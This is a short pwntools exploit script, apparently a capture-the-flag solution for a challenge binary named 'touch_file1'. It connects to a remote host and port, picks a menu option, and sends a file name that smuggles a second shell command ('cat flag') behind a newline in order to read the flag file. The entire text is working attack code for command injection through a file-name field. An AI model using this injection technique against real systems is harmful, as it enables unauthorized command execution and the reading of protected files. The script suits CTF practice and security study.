from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#p = process('./touch_file1')
p = remote('43.249.195.138', 20236)


p.recvuntil('> ')
num = b'1'
p.send(num)
p.recvuntil('file_name: ')
cmd = b'\ncat flag\0'
p.send(cmd)

p.interactive()
